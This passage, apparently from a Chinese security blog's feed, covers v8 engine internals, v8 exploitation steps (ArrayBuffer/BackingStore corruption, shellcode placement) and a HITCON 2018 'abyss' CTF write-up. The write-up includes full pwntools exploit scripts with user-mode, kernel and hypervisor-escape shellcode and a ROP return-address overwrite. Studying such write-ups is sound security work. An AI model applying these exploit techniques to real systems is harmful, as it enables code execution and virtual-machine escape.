之后便只有TurboFan这一个优化编译器了. v8内存构成v8进程的内存通常由以下几个块构成. 新生代内存区(new space):大多数的对象都会被分配在这里,这个区域很小但是垃圾回收比较频繁. 老生代内存区(old space):属于老生代,这里只保存原始数据对象,这些对象没有指向其他对象的指针. 大对象区(large object space):存放体积超越其他区大小的对象,每个对象有自己的内存,垃圾回收其不会移动大对象区. 代码区(code space):代码对象,会被分配在这里,唯一拥有执行权限的内存. map区(map space):存放Cell和Map,每个区域都是存放相同大小的元素,结构简单. v8内存生命周期 新建对象obj被分配到new space. 随着程序的运行,new space满了,GC开始清理new space里的死对象,如果obj还处于活跃状态,就不会被清理出去.否则结束. GC清理了两遍new space,发现obj依然还活跃着,就把obj移动到了old space. 随着程序的运行,old space也满了,GC开始清理old space,这时候如果obj已经没有被引用了,就会把obj给清理出去.否则继续停留. v8优化机制Hiddern Class在v8中,每个JavaScript对象都有一个HiddenClass关联.HiddenClass存储有关对象形状的信息,除其他外,还存储从属性名称到索引到属性的映射. JavaScript对象数组索引属性存储在单独的元素存储中,命名属性存储在属性存储中,元素和属性可以是数组或字典. JavaScript对象每个property的值都以array的形式进行存储,通过偏移值访问array里的property值.而偏移值和属性名称的依赖关系保留给另一个类,也就是Hiddern Class. 在v8中,JavaScript对象的第一个字段指向HiddenClass(对于v8堆上并由垃圾回收器管理的任何对象都是这种情况).HiddenClass第三位字段,用于存储属性的数量和指针到描述符数组.描述符数组包含有关命名属性的信息,例如名称本身和值的存储位置. Hiddern Class随着对象的创建与属性的添加而产生. 创建一个对象o时会产生一个没有property的Hiddern Class,假设叫做Map1,o内部指向Map1(对象的前8个字节是一个指向Hiddern Class的指针). 向o添加属性x时会在Map1基础上产生一个添加x的type与offset信息对的Hiddern Class,称为Map2,o内部指向Map2,同时在Map1中添加转换条件:当x加入时转移到Map2. 向o添加属性y时会在Map2基础上产生一个添加y的type与offset信息对的Hiddern Class,称为Map3,o内部指向Map3,同时在Map2中添加转换条件:当y加入时转移到Map3. 当访问o.x的值时,会跟踪o所持有的指针(由该指针产生的链表也叫做transition链)找到Map2获取x的偏移量从而获取对象数组中的值. 从Hidden Class实现中可以看到,如果是相同类型,那么Hidden Class指针是相同的.如果属性添加顺序不同,会变成不同的Hiddern Class. 当property增加到11个以上,使用外部的array来管理,也就是Fast property. 如果再进一步增加property,那么就会用object外的dictory来管理,也就是slow/dict properties.也被称为self-contained,因为没有使用Hiddern Class且使用外部的dictory保存所有的信息. Inline CachingInline Caching通过对于某些action和类型进行缓存来优化,例如缓存之前的访问去加速property访问速度,或者在循环和函数中多次被多次调用的action的code. 具体则是通过将Hidden Class地址或者其中的偏移替代原来的索引进行优化.具体会通过判断对象类型来决定是否调用缓存,所以实际开发中要保证属性添加顺序以保证Hiddern Class的相同. ICState. UNINITIALIZED(0):未初始化. PREMONOMORPHIC(.):只被执行一次的情况,还没进行IC. MONOMORPHIC(1):IC注册一个的状态(快速). POLYMORPHIC(P):IC注册两个以上的状态(一般的快). MEGAMORPHIC(N):IC注册多个的状态. GENERIC(G):IC已停止的状态. Inline Caching可通过-trace-ic进行确认.使用–use-ic启用IC(默认),使用–no-use-ic禁用IC. CodeStubAssemblerv8使用CodeStubAssembler,一种可以用来生成汇编语言的汇编器,其使用的表示方式是一种DSL,通过编写DSL伪汇编代码然后生成汇编代码,达到高效率以及跨平台的目的. TF_BUILTIN:创建一个函数. Label:定义一个标签. BIND:绑定一个标签. Branch:条件跳转指令. VARIABLE:定义一些变量. Goto:跳转. DebugBreak():断点. Print():输出变量. 垃圾收集机制v8使用GC(垃圾收集)机制单独管理JavaScript对象(HeapObject),检测废弃的对象并自动释放它们. GC区域由多个mmap出来的区域组成,v8内部使用的各种HeapObject被保留在这个区域. 根据区域中object的生存时间,GC区域被分为新生代(Young generation,存活时间较短的对象)和老生代(Old generation,存活时间较长或常驻内存的对象).除此之外,还有一些区域不属于任何一个generation,称为Other. 对象起初都会被分配到新生代,当新生代中的对象满足某些条件时,会被移动到老生代. 默认情况下,64位环境下的v8引擎的新生代内存大小32MB,老生代内存大小为1400MB,而32位则减半,分别为16MB和700MB. v8内存的最大保留空间分别为1464MB(64位)和732MB(32位).具体的计算公式是4 * reserved_semispace_space_ + max_old_generation_size_,新生代由两块reserved_semispace_space_组成. 新生代在新生代分配内存非常容易,只需要保存一个指向内存区的指针,不断根据新对象的大小进行递增即可.当该指针到达了新生代内存区的末尾,就会有一次清理(仅仅是清理新生代). 新生代使用Scavenge算法进行回收,在Scavenge算法的实现中,主要采用了Cheney算法. Cheney算法算法是一种采用复制的方式实现的垃圾回收算法.它将内存一分为二,每一部分空间称为semispace. 在这两个semispace中,一个处于使用状态,另一个处于闲置状态.处于使用状态的semispace空间称为From空间,处于闲置状态的空间称为To空间,分配对象时,先是在From空间中进行分配.当开始进行垃圾回收算法时,会检查From空间中的存活对象,这些存活对象将会被复制到To空间中(复制完成后会进行紧缩),而非活跃对象占用的空间将会被释放. 完成复制后,From空间和To空间的角色发生对换.也就是说,在垃圾回收的过程中,就是通过将存活对象在两个semispace之间进行复制.复制的过程采用的是BFS的思想,从根对象出发,广度优先遍历所有能到达的对象. 具体的执行过程. 首先将From空间中所有能从根对象到达的对象复制到To区,然后维护两个To区的指针scanPtr和allocationPtr,分别指向即将扫描的活跃对象和即将为新对象分配内存的地方,开始循环. 循环的每一轮会查找当前scanPtr所指向的对象,确定对象内部的每个指针指向哪里.如果指向老生代不必考虑,如果指向From区,就需要把这个所指向的对象从From区复制到To区,具体复制的位置就是allocationPtr所指向的位置. 复制完成后将scanPtr所指对象内的指针修改为新复制对象存放的地址,并移动allocationPtr.如果一个对象内部的所有指针都被处理完,scanPtr就会向前移动,进入下一个循环. 若scanPtr和allocationPtr相遇,则说明所有的对象都已被复制完,From区剩下的都可以被视为垃圾,进行清理了. 如果新生代中的一个对象只有一个指向它的指针,而这个指针在老生代中,为了判断这个新生代的对象是否存活,需要建立一个列表用来记录所有老生代对象指向新生代对象的情况. 当一个对象经过多次新生代的清理依旧幸存,这说明它的生存周期较长,也就会被移动到老生代,这称为对象的晋升.晋升的标准有两种. 对象从From空间复制到To空间时,会检查它的内存地址来判断这个对象是否已经经历过一个新生代的清理,如果是,则复制到老生代中,否则复制到To空间中. 对象从From空间复制到To空间时,如果To空间已经被使用了超过25%,那么这个对象直接被复制到老生代. 老生代v8在老生代中的垃圾回收策略采用Mark-Sweep和Mark-Compact相结合.主要采用标记清除算法,如果空间不足以分配从新生代晋升过来的对象时,才使用标记整理. Mark-Sweep分为标记和清除两个阶段. 标记清除有一个问题就是进行一次标记清楚后,内存空间往往是不连续的,会出现很多的内存碎片.如果后续需要分配一个需要内存空间较多的对象时,如果所有的内存碎片都不够用,将会使得v8无法完成这次分配,提前触发垃圾回收. Mark-Compact正是为了解决标记清除所带来的内存碎片的问题.标记整理在标记清除的基础进行修改,将其的清除阶段变为紧缩极端.在整理的过程中,将活着的对象向内存区的一段移动,移动完成后直接清理掉边界外的内存.紧缩过程涉及对象的移动,所以效率并不是太好,但是能保证不会生成内存碎片. 标记清除和标记整理都分为两个阶段:标记阶段,清除或紧缩阶段. 在标记阶段,所有堆上的活跃对象都会被标记.每个内存页有一个用来标记对象的位图,位图中的每一位对应内存页中的一个字.另外有两位用来标记对象的状态,这个状态一共有三种:白,灰,黑. 如果一个对象为白对象,它还没未被垃圾回收器发现. 如果一个对象为灰对象,它已经被垃圾回收器发现,但其邻接对象尚未全部处理. 如果一个对象为黑对象,说明其不仅被垃圾回收器发现,其邻接对象也全部被处理完毕了. 如果将堆中的对象看做由指针做边的有向图,标记算法的核心就是DFS. 在初始时,位图为空,所有的对象也都是白对象.从根对象到达的对象会背染色为灰色,放入一个单独的双端队列中. 标记阶段的每次循环,垃圾回收器都会从双端队列中取出一个对象并将其转变为黑对象,并将其邻接的对象转变为灰,然后把其邻接对象放入双端队列. 特别大的对象,可能会在处理时进行分片,防止双端队列溢出.如果双端队列溢出,则对象仍然会成为灰对象,但不会被放入队列中,这将导致其邻接对象无法被转变为灰对象. 如果所有对象都变成黑对象,则结束.在双端队列为空时,需要扫描所有对象,如果仍有灰对象,将它们重新放入队列中进行处理. 标记结束后,所有的对象都应该非黑即白,白对象将成为垃圾,等待释放. 清除和紧缩阶段都是以内存页为单位回收内存. 清除时垃圾回收器会扫描连续存放的死对象,将其变成空闲空间,并保存到一个空闲空间的链表中.这个链表常被scavenge算法用于分配被晋升对象的内存,但也被紧缩算法用于移动对象. 紧缩算法会尝试将碎片页整合到一起来释放内存.由于页上的对象会被移动到新的页上,需要重新分配一些页. 对目标碎片页中的每个活跃对象,在空闲内存链表中分配一块内存页,将该对象复制过去,并在碎片页中的该对象上写上新的内存地址. 随后在迁出过程中,对象的旧地址将会被记录下来,在迁出结束后,v8会遍历所有它所记录的旧对象的地址,将其更新为新地址. 由于标记过程中也记录了不同页之间的指针,这些指针在此时也会进行更新. 如果一个页非常活跃,如其中有过多需要记录的指针,那么地址记录会跳过它,等到下一轮垃圾回收进行处理. v8的objectv8自定义了一些类,并针对C++类结构制作了触发器来与GC合作.v8的object没有成员变量,也没有虚函数和构造/析构函数. 继承关系在文件v8/src/objects.h中. 1234567891011121314151617181920// v8/src/objects.h// Most object types in the V8 JavaScript are described in this file.// Inheritance hierarchy:// - Object// - Smi (immediate small integer)// - HeapObject (superclass for everything allocated in the heap)// - JSReceiver (suitable for property access)// - JSObject// - JSArray// - JSArrayBuffer// - JSArrayBufferView// - JSTypedArray// - JSDataView// - JSBoundFunction//...// Formats of Object*:// Smi: [31 bit signed int] 0// HeapObject: [32 bit direct pointer] (4 byte aligned) | 01 v8所有类都继承自Object,它由以下两种类型组成. Smi:整数值,整数由带符号的31(32位,64位为带符号的32位范围)位范围表示. HeapObject:指针类型,除能在Smi范围表达的整数值之外的其他数据,始终有一个指向Map的指针,由于HeapObject基本上由GC管理,因此它位于GC区域(而不是堆区域). Smi与HeapObject不一样,HeapObject以指针的形式保存对象的内存中,而Smi直接保存在对象的内存中.v8使用最低位来区分两者. 在最新版中指针都是只有后32位,Smi(包括length等整数值)保存为原来的两倍从而使末尾为0. HeapNumberHeapNumber以double形式(图中标黄)保存浮点数或者不能在Smi范围内表达的整数. NameName只有一个子类:String. StringString存储字符串. OddballOddball表示特殊值的对象,例如true,false,undefined. JSReceiver -&gt; JSObjectJSObject是表示JavaScript对象的对象. 12345678[ hiddenClass / map ] -&gt; ... ; 指向Map[ properties ] -&gt; [empty array][ elements ] -&gt; [empty array][ reserved #1 ] -\[ reserved #2 ] |[ reserved #3 ] &#125;- in object properties,即预分配的内存空间............... |[ reserved #N ] -/ Map中存储了一个对象的元信息,包括对象上属性的个数,对象的大小以及指向构造函数和原型的指针等等.同时,Map中保存了Js对象的属性信息,也就是各个属性在对象中存储的偏移.然后属性的值将根据不同的类型,放在properties,elements以及预留空间中. properties:又称为NamedProperties,用于保存通过属性名作为索引的元素值,类似于字典类型,实体是FixedArray. element:又称为IndexedProperties,用于保存通过整数值作为索引的元素值,类似于常规数组,实体是FixedArray. reserved #n,为了提高访问速度,v8在对象中预分配了的一段内存区域,用来存放一些properties(称为in-object properties),当向object中添加属性时,会先尝试将新属性放入这些预留的槽位.当in-onject槽位满后,v8才会尝试将新的属性放入properties中. JSFunctionJSFunction是表示JavaScript Function的对象. kCodeEntryOffset是一个指向JIT代码(RWX区域)的指针,许多实现任意代码执行的策略都是在此编写shell代码. v8从6.7版本之后,function的code不再可写,也就是不能直接修改JIT代码. JSArrayJSArray是表示JavaScript Array的对象. JSArrayBuffer &amp;&amp; JSTypedArrayJSArrayBuffer对象用来表示通用的,固定长度的原始二进制数据缓冲区.ArrayBuffer不能直接操作,而是要通过视图进行操作. JSTypedArray用来生成内存的视图,通过9个构造函数可以生成对应的视图,比如Uint8Array,Int16Array,Float64Array等等. 在v8中,对象通常被存放在由GC管理的mmapped区域,然而BackingStore是一个不被GC管理的区域,并且被存放在heap中.由于它不是由GC管理的HeapObject,因此指向BackingStore的指针末位没有指示作用. ArrayBuffer就代表一段原始的二进制数据,而TypedArray代表了一个确定的数据类型,当TypedArray与ArrayBuffer关联,就可以通过特定的数据类型格式来访问内存空间.]]></content>
      <categories>
        <category>binary</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-v8-pwn-exploit]]></title>
    <url>%2Fposts%2F84b06055%2F</url>
    <content type="text"><![CDATA[步骤 创建一个用于调试的js环境版本.如果有一个包含漏洞的patch,hit和build它. 分析patch以确定哪个patch适用于哪个进程:Full-Codegen,Crankshaft,TurboFan,Ignition,AST,IC. 编写利用漏洞的js代码段. 创建一个任意地址读/写的原语,主要使用ArrayBuffer和TypedArray. getshell.例如在JIT区域嵌入shell代码. 调试技巧12%DebugPrint()#通过该函数打印出对象的详细信息,如内存地址,属性,map等.运行时使用参数--allow-natives-syntax. 当分析v8源码时,遇到CodeStubAssembler编写的代码,可以在其中插入DebugBreak(),这相当于插入了一个断点(类似int 3),重新编译后使用调试器调试时,可以在插入处断下. 同样,遇到CodeStubAssembler编写的代码时,可以使用Print()来输出一些变量值,例如:Print(&quot;array&quot;, static_cast&lt;Node*&gt;(array.value()));,重新编译即可. 可以在运行的js代码中插入readline()让程序停下来等待输入,方便调试. 通过引用tools里面的gdb脚本可以使用一些较为方便的指令. 12job(&amp;object)#打印出对象的详细信息 漏洞利用ArrayBuffer &amp;&amp; TypedArray在ArrayBuffer中存在一个BackingStore指针,这个指针指向的就是ArrayBuffer开辟的内存空间,可以使用TypedArray指定的类型读取和写入该区域,且这片内存区域是位于系统堆中的. 利用思路. 修改ArrayBuffer中的Length造成越界访问. 修改BackingStore指针获得任意读写的能力. 通过BackingStore指针泄露堆地址,在堆中布置shellcode.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>v8-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hitcon-2018-abyss]]></title>
    <url>%2Fposts%2Fddc429e1%2F</url>
    <content type="text"><![CDATA[分析题目给了三个二进制文件:hypervisor.elf,kernel.bin,user.elf. 其中hypervisor.elf,user.elf是ELF64文件,而kernel.bin是纯二进制代码文件. 分析可知主程序为hypervisor.elf,该程序利用kvm给VM分配VCPU和memory,并加载一个小型的内核kernel.bin到虚拟机的0地址开始的内存空间,然后使用ioctl的KVM_RUN request来启动VM,当遇到中断或者异常时,ioctl就会返回,这时可以通过检查exit_reason来得知中断或者异常的类型并做相应处理,例如I/O请求. kernel.bin实现了内存管理和中断处理,提供了loader启动和libc加载需要的一些常见syscall,然后直接加载ld.so.2来装载用户态程序user.elf.kernel.bin在处理syscall时,将一些与I/O有关的指令通过CPU的in/out指令触发中断交给hypervisor来处理. 漏洞user.elfuser.elf漏洞是swap的时候没有检查可以直接改掉stack_pointer. IDA逆向的时候发现代码(*__ctype_b_loc())[(unsigned __int8)s[i]] &amp; 0x800就是isdigit(s[i]). 123456789101112131415161718192021222324252627282930313233from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)shellcode = asm( shellcraft.pushstr('flag') + shellcraft.syscall('SYS_open', 'rsp', 0) + "sub rbp, 0x200\n" + shellcraft.syscall('SYS_read', 'rax', 'rbp', 0x30) + shellcraft.syscall('SYS_write', 1, 'rbp', 'rax'))r.sendline(shellcode)r.interactive() kernel.binhypervisor给kernel的物理内存有0x2000000大小,kernel被加载到0的位置,0-0x200000为内核地址空间,高地址0x200000-0x2000000为用户地址空间. 找到系统调用表,然后逐个分析syscall即可.漏洞是在处理read时,没有检查kmalloc返回0的情况,可以将内存耗尽,这样kmalloc就会因为空间不足而返回0,从而通过read直接改掉内核代码,执行内核shellcode. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)sleep(0.5)shellcode = asm( shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) + shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000))r.sendline(shellcode)sleep(0.5)k_shellcode = "\x90" * 0xe78 + asm(""" lea rdi, [rip + flag] and rdi, 0xfffff call hp_open mov rdi, rax mov rsi, 0 cdq mov dh, 1 call hp_read mov rdi, 1 mov rsi, 0 mov rdx, rax call hp_write hlt hp_open: mov esi, edi mov edi, 0x8000 jmp hypercallhp_read: lea rax, [rip+buf] mov qword ptr [rax], rdi mov qword ptr [rax+8], rsi mov qword ptr [rax+16], rdx mov esi, eax mov edi, 0x8001 jmp hypercallhp_write: lea rax, [rip+buf] mov qword ptr [rax], rdi mov qword ptr [rax+8], rsi mov qword ptr [rax+16], rdx mov esi, eax mov edi, 0x8002 jmp hypercallhypercall: mov dx, di mov eax, esi out dx, eax in eax, dx mov edi, eax mov eax, edi ret flag: .string "flag2" buf:""")r.sendline(k_shellcode)r.interactive() hypervisor.elfhypervisor里有一个0x8008的port可以处理ioctl请求,且没有做任何检查.可以用KVM_SET_USER_MEMORY_REGION将hypervisor其他的可写内存给插到VM里面. 首先通过/proc/self/maps文件泄露地址,之后构造一个memory region. 1234567struct kvm_userspace_memory_region region = &#123; .slot = 1, .flags = 0, .guest_phys_addr = 0x2000000, .memory_size = 0x21000, .userspace_addr = [stack_addr]&#125;; 但现在还不能直接在kernel中访问这块地址,因为它没有页表项.在64位的long mode下,所有的访存都需要经过页表,而hypervisor和kernel并没有为高于0x2000000设置页映射,所以需要手动为它加上一个页表项. kernel在刚启动时对page table做了下面的操作. 12345678910111213/* Maps * 0x8000000000 ~ 0x8002000000 -&gt; 0 ~ 0x2000000 */void init_pagetable() &#123; uint64_t* pml4; asm("mov %[pml4], cr3" : [pml4]"=r"(pml4)); uint64_t* pdp = (uint64_t*) ((uint64_t) pml4 + 0x3000); pml4[1] = PDE64_PRESENT | PDE64_RW | (uint64_t) pdp; // 0x8000000000 uint64_t* pd = (uint64_t*) ((uint64_t) pdp + 0x1000); pdp[0] = PDE64_PRESENT | PDE64_RW | (uint64_t) pd; for(uint64_t i = 0; i &lt; 0x10; i++) pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE);&#125; 在PML4第1项上放了1个PDP,在PDP中初始化了16个page,这些page都是带有PDE64_PS标志位的,这代表着它们不是下一级PD的地址,而是1个0x200000的page的直接映射.因为PML4第1项对应的Virtual Address的39-47位为1,实际上就是一组0x8000000000 ~ 0x8002000000到0 ~ 0x2000000的映射. 同理,可以在PDP的末尾加上1项,将0x8002000000 ~ 0x8002200000映射到0x2000000 ~ 0x2200000,这样就可以通过0x8002000000来访问物理地址0x2000000,也就是hypervisor栈的底部了. 之后就是在这段内存中搜索KVM_RUN这个ioctl调用的返回地址,并把ROP链布置上去,再用hlt触发中断就可以了. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191from pwn import *context.arch = "amd64"r = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf", shell = True)#r = process("./user.elf")#gdb.attach(r)r.recvuntil("keep going down.\n")payload = str((0x2020a4 - 0x202020) / 4 - 2) + "_\\"payload += "z:" + str(0x2030a4 + 0x20 - 0x796) + "+z;,"payload = payload.ljust(0x20, '?')shellcode = asm( "lea rbp, [rip + sh]\n" + shellcraft.syscall('SYS_read', 0, 'rbp', 0x100) + "nop\nsh:\n")payload += shellcoder.sendline(payload)sleep(0.5)shellcode = asm( shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) + shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000))r.sendline(shellcode)sleep(0.5)k_shellcode = "\x90" * 0xe78 + asm(""" /* leak */ lea rdi, [rip + maps] and rdi, 0xfffff call hp_open mov rdi, rax mov rsi, 0 cdq mov dh, 0xff call hp_read mov rdi, 1 mov rsi, 0 mov rdx, rax call hp_write lea rdi, [rip + uaddr] call read_ptr lea rdi, [rip + libc_base] call read_ptr lea rdi, [rip + text_base] call read_ptr /* map stack =&gt; VM memory */ mov rdi, 4 /* vmfd */ mov rsi, 0x4020AE46 /* KVM_SET_USER_MEMORY_REGION */ lea rcx, [rip + region] mov edx, ecx call hp_ioctl test rax, rax jne hp_panic call extend_paging /* edit page table */ movabs rbp, 0x8002000000 mov rax, rbp mov rcx, [rip + text_base] add rcx, 0x1743 /* main's return address */loop2: cmp rcx, qword ptr [rax] /* find main's return address */ je break2 add rax, 8 jmp loop2break2: mov rcx, [rip + libc_base] add rcx, 0x4f2c5 /* one_gadget */ mov qword ptr [rax], rcx xor rcx, rcx hltextend_paging: mov rax, cr3 add rax, 0x4000 mov rdx, 0x10 /* i */loop: cmp rdx, 0x20 je break /* pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE); */ mov rdi, rdx imul rdi, 8 mov rcx, rax add rcx, rdi mov rdi, rdx imul rdi, 0x200000 or rdi, 1 | (1 &lt;&lt; 1) | (1 &lt;&lt; 7) mov qword ptr [rcx], rdi inc rdx jmp loopbreak: retread_ptr: mov esi, edi xor rdi, rdi mov rdx, 8 jmp hp_readhp_open: mov esi, edi mov edi, 0x8000 jmp hypercallhp_exit: mov esi, edi mov edi, 0x8006 jmp hypercallhp_arg3: lea rax, [rip + buf] mov qword ptr [rax], rdi mov qword ptr [rax + 8], rsi mov qword ptr [rax + 16], rdx mov esi, eax rethp_read: call hp_arg3 mov edi, 0x8001 jmp hypercallhp_write: call hp_arg3 mov edi, 0x8002 jmp hypercallhp_ioctl: call hp_arg3 mov edi, 0x8008 jmp hypercallhp_panic: lea rdi, [rip + orz] mov eax, edi mov edi, 0xffff jmp hypercallhypercall: mov dx, di mov eax, esi out dx, eax in eax, dx mov edi, eax mov eax, edi retmaps: .string "/proc/self/maps"orz: .string "w4rd3n"buf: .quad 0 .quad 0 .quad 0region: slot: .long 1 flags: .long 0 gpa: .quad 0x2000000 mem_size: .quad 0x21000 uaddr: .quad 0 /* stack_base */libc_base: .quad 0text_base: .quad 0""")r.sendline(k_shellcode)pie = int(r.recvline()[:12], 16)r.recvuntil("/dev/zero (deleted)\n")libc = int(r.recvline()[:12], 16)r.recvuntil("/dev/zero (deleted)\n")r.recvuntil("ld-2.27.so\n")r.recvuntil("ld-2.27.so\n")r.recvline()stack = int(r.recvline()[:12], 16)r.send(p64(stack) + p64(libc) + p64(pie))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-virtualization-基础]]></title>
    <url>%2Fposts%2F19179416%2F</url>
    <content type="text"><![CDATA[虚拟化初探在计算机中,虚拟化是指创建一个虚拟版本的东西,包括硬件,存储设备和网络资源. 管理程序(Hypervisor)或VMM(Virtual Machine Monitor,虚拟机监视器)是一种可以在同一物理硬件上创建分离的多台(虚拟)机器的软件. VMM是在给出的虚拟化环境中管理CPU,内存,I/O设备,中断和指令集的软件.hypervisor可能指带有VMM的操作系统.这两个术语也可以被认为是同义词. 虚拟机管理程序需要考虑:CPU和内存虚拟化(特权指令,页表);IO设备虚拟化(网络,磁盘,BIOS). 论文虚拟化第三代体系结构的正式要求准确定义了为了有效的支持虚拟化所需满足的条件. 等价性:程序运行在虚拟机中和运行在本地完全相同,不包括资源可用性和时间的差异.性能:绝大多数的客户指令由硬件执行,没有VMM的介入.安全性:VMM管理所有硬件资源. 早期的虚拟化技术被称为陷阱和模拟(经典虚拟化),VMM捕获客户机操作系统运行特定指令(敏感指令或特权指令)时发生的异常并模拟完成该指令.由于许多如敏感非特权指令的阻碍,x86不是经典可虚拟化的. VMM操作系统是设计在直接运行在裸硬件设备上的,它自动认为它完全占有计算机硬件.x86架构提供四个特权级别给操作系统和应用程序来访问硬件. 宿主操作系统是工作在Ring 0的,客户操作系统就不能也在Ring 0.但是客户操作系统不知道,以前执行什么指令,现在还是执行什么指令,但是没有执行权限是会出错的. 虚拟机管理程序(VMM)就是处理这种情况的,根据其原理不同有三种实现技术. 全虚拟化. 半虚拟化. 硬件辅助的虚拟化. 管理程序又可以分为以下三类. 裸机管理程序(例如Xen,VMWare ESXi,Hyper-V). 主机管理程序(例如VirtualBox,VMWare Workstation). 仅主机管理程序(例如SimpleVisor,HyperPlatform,kvm). 基于二进制翻译的全虚拟化 客户操作系统运行在Ring 1,它在执行特权指令时会触发异常,然后VMM捕获这个异常,在异常里面做翻译,模拟,最后返回到客户操作系统内,客户操作系统认为自己的特权指令工作正常,继续运行.这种处理方式性能损耗大. 早期的VMWare Workstation针对x86架构特殊设计的就是这种实现.VMWare打包为一个正常的应用程序被运行在宿主操作系统上,同时每个虚拟机实例以进程(vmware-vmx.exe)的形式运行在宿主操作系统上. VMWare的VMM可以在系统级运行,在一段有限的时间内完全控制硬件,在这段时间内宿主操作系统被从虚拟和线性内存中短暂移除.VMM和宿主操作系统的上下文切换又称为世界切换,每个上下文有自己的地址空间,中断描述符表,堆栈,执行上下文. 也就是说驻留在宿主机的VMM驱动程序实现了一系列操作,包括锁定物理内存页,转发中断以及调用世界切换原语. VMM保护VMM必须为自己保留部分客户机虚拟地址空间同时阻止客户机访问VMM正在使用的客户机VA空间的那些部分. 客户机用户模式应用在Ring 3正常运行,而客户机内核代码被降权在运行在Ring 1或%cpl = 1上的二进制翻译下运行.此时虚拟机段被VMM截断来确保它们不会与VMM自身重叠,任何尝试从VM访问VMM段的行为会触发会被VMM正确处理的通常保护错误. 同时预留一个段寄存器%gs,用来始终指向VMM区域.二进制翻译器保证在翻译时没有虚拟机指令会直接使用gs前缀,翻译后的代码将fs寄存器用于最初具有fs或gs前缀的VM指令. VMM截断段的方式是通过不改变基址减少段描述符的范围,这会导致VMM必须在地址空间的最顶端区域.在实现中VMWare设置VMM的大小为4MB. CPU虚拟化VMWare使用DE运行客户机用户模式应用以及BT运行客户机系统代码(内核).BT(二进制翻译)将输入的可执行指令序列转换成可以在目标系统自身上执行的二进制指令序列,动态二进制翻译器在运行时通过存储目标序列到称为翻译缓存的缓冲区中来执行翻译. 内存虚拟化虚拟内存到物理内存的转换由MMU通过名为页表的查找表完成,当尝试访问某些虚拟内存时硬件页面遍历器遍历那些页表来将VA翻译为PA.同时结果会缓存在成为TLB的CPU缓存中. VMM通过名为影子页表的技术管理从客户机物理内存到机器物理内存的映射. 设备虚拟化VMWare使用宿主操作系统的设备资源接口来执行虚拟机中对资源的调用. 超虚拟化/类虚拟化-Paravirtualization 类虚拟化的思想就是,修改操作系统内核,替换掉不能虚拟化的指令,通过超级调用(hypercall)直接和底层的虚拟化层hypervisor来通讯,hypervisor同时也提供了超级调用接口来满足其他关键内核操作,比如内存管理,中断和时间保持.这种做法省去了全虚拟化中的捕获和模拟. 对于Xen这种类虚拟化技术,客户机操作系统都是有一个专门的定制内核版本,和x86,mips这些内核版本等价.性能损耗非常低. Xen中用域来指代正在运行客户操作系统的虚拟机.Domain0是Xen管理程序启动时的第一个域,会运行一个Linux操作系统,该域可以访问硬件及管理其他域.其他域被称为DomUs,能运行任何已经移植到Xen的操作系统. VMM保护和VMWare一样,客户操作系统内核被降权后占据Ring 1,Xen占据在Ring 0,用户模式应用依然运行在Ring 3. Xen被映射到每个客户操作系统的顶部64M内存的地址空间中,以节省TLB刷新.虚拟机的段被VMM截断以确保它们不会与VMM自身重叠.用户模式应用使用被截断的段运行,并受到自身操作系统的限制,无法使用页保护pet.us来访问客户内核区域. CPU虚拟化无论何时客户机需要执行一个特权操作,客户机使用hypercall来跳转到Xen中,可以把hypercall看作是允许用户代码以可信代码的控制和管理的方式执行特权指令. hypercall在一个常规的操作系统中以类似系统调用的方式被调用:一个软中断被引发,中断的向量指向Xen中的入口点.32位x86机器上指令是int 0x82,64位是syscall.hypercall的向量编号被放在eax中,在xen/include/public/xen.h可以找到讲这些值与符号hypercall名称相映射的列表. 异常,包括内存错误和软件陷入,在x86上直接被虚拟化了.提供了一个虚拟IDT,一个域可以通过HYPERVISORsettraptable这个hypercall向Xen提交陷入处理程序表. 大多数陷阱处理程序和原生x86的处理程序是相同的,因为在Xen的类虚拟化架构中,异常栈帧是没有被修改的,但页错误处理程序有些不同,原因是正常的页错误处理程序从CR2读取导致错误的地址,这需要Ring 0权限.所以Xen将错误的地址写入扩展栈帧,当在Ring 0外执行时发生了异常,Xen的处理程序在客户机操作系统栈上创建异常栈帧的副本,并将控制权返回给相应的已注册的处理程序. 位于xen/i386/kernel/entry.S的文件包含了系统调用和故障低级处理程序. 